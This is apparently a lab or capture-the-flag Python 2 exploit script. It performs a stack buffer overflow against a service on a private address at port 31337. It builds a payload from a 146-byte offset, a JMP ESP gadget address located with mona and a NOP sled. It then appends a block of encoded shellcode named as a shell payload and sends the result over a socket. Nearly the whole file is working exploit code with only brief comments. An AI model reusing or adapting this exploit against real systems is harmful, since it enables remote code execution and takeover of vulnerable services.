#!/usr/bin/env python2
import socket

RHOST="192.168.2.211"
RPORT=31337

badchar_test = ""
badchars = [0x00, 0x0A] #know in advance because of string input

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#find gardget locations
#!mona jmp -r esp -cpb "\x00\x0A"
#080414c3,080416bf
addr_jmp_esp=0x080414c3
import struct
addr_jmp_esp_LE=struct.pack("<I",addr_jmp_esp)
buf_totlen=1024
offset=146

#need nops to have it read the shellcode right.
#or could use: msf-metasmshell and then sub esp,0x10

shellcode_shell =  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode_shell += b"\xbb\xab\x51\x47\xd6\xd9\xc7\xd9\x74\x24"
shellcode_shell += b"\xf4\x58\x2b\xc9\xb1\x52\x31\x58\x12\x83"
shellcode_shell += b"\xc0\x04\x03\xf3\x5f\xa5\x23\xff\x88\xab"
shellcode_shell += b"\xcc\xff\x48\xcc\x45\x1a\x79\xcc\x32\x6f"
shellcode_shell += b"\x2a\xfc\x31\x3d\xc7\x77\x17\xd5\x5c\xf5"
shellcode_shell += b"\xb0\xda\xd5\xb0\xe6\xd5\xe6\xe9\xdb\x74"
shellcode_shell += b"\x65\xf0\x0f\x56\x54\x3b\x42\x97\x91\x26"
shellcode_shell += b"\xaf\xc5\x4a\x2c\x02\xf9\xff\x78\x9f\x72"
shellcode_shell += b"\xb3\x6d\xa7\x67\x04\x8f\x86\x36\x1e\xd6"
shellcode_shell += b"\x08\xb9\xf3\x62\x01\xa1\x10\x4e\xdb\x5a"
shellcode_shell += b"\xe2\x24\xda\x8a\x3a\xc4\x71\xf3\xf2\x37"
shellcode_shell += b"\x8b\x34\x34\xa8\xfe\x4c\x46\x55\xf9\x8b"
shellcode_shell += b"\x34\x81\x8c\x0f\x9e\x42\x36\xeb\x1e\x86"
shellcode_shell += b"\xa1\x78\x2c\x63\xa5\x26\x31\x72\x6a\x5d"
shellcode_shell += b"\x4d\xff\x8d\xb1\xc7\xbb\xa9\x15\x83\x18"
shellcode_shell += b"\xd3\x0c\x69\xce\xec\x4e\xd2\xaf\x48\x05"
shellcode_shell += b"\xff\xa4\xe0\x44\x68\x08\xc9\x76\x68\x06"
shellcode_shell += b"\x5a\x05\x5a\x89\xf0\x81\xd6\x42\xdf\x56"
shellcode_shell += b"\x18\x79\xa7\xc8\xe7\x82\xd8\xc1\x23\xd6"
shellcode_shell += b"\x88\x79\x85\x57\x43\x79\x2a\x82\xc4\x29"
shellcode_shell += b"\x84\x7d\xa5\x99\x64\x2e\x4d\xf3\x6a\x11"
shellcode_shell += b"\x6d\xfc\xa0\x3a\x04\x07\x23\x85\x71\x05"
shellcode_shell += b"\x44\x6d\x80\x09\xae\xbc\x0d\xef\xc4\x50"
shellcode_shell += b"\x58\xb8\x70\xc8\xc1\x32\xe0\x15\xdc\x3f"
shellcode_shell += b"\x22\x9d\xd3\xc0\xed\x56\x99\xd2\x9a\x96"
shellcode_shell += b"\xd4\x88\x0d\xa8\xc2\xa4\xd2\x3b\x89\x34"
shellcode_shell += b"\x9c\x27\x06\x63\xc9\x96\x5f\xe1\xe7\x81"
shellcode_shell += b"\xc9\x17\xfa\x54\x31\x93\x21\xa5\xbc\x1a"
shellcode_shell += b"\xa7\x91\x9a\x0c\x71\x19\xa7\x78\x2d\x4c"
shellcode_shell += b"\x71\xd6\x8b\x26\x33\x80\x45\x94\x9d\x44"
shellcode_shell += b"\x13\xd6\x1d\x12\x1c\x33\xe8\xfa\xad\xea"
shellcode_shell += b"\xad\x05\x01\x7b\x3a\x7e\x7f\x1b\xc5\x55"
shellcode_shell += b"\x3b\x3b\x24\x7f\x36\xd4\xf1\xea\xfb\xb9"
shellcode_shell += b"\x01\xc1\x38\xc4\x81\xe3\xc0\x33\x99\x86"
shellcode_shell += b"\xc5\x78\x1d\x7b\xb4\x11\xc8\x7b\x6b\x11"
shellcode_shell += b"\xd9"

buf=""
buf="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= addr_jmp_esp_LE
buf+= shellcode_shell #esp points here
buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#!mona compare -a esp -f c:\badchartest.bin
#to compare them
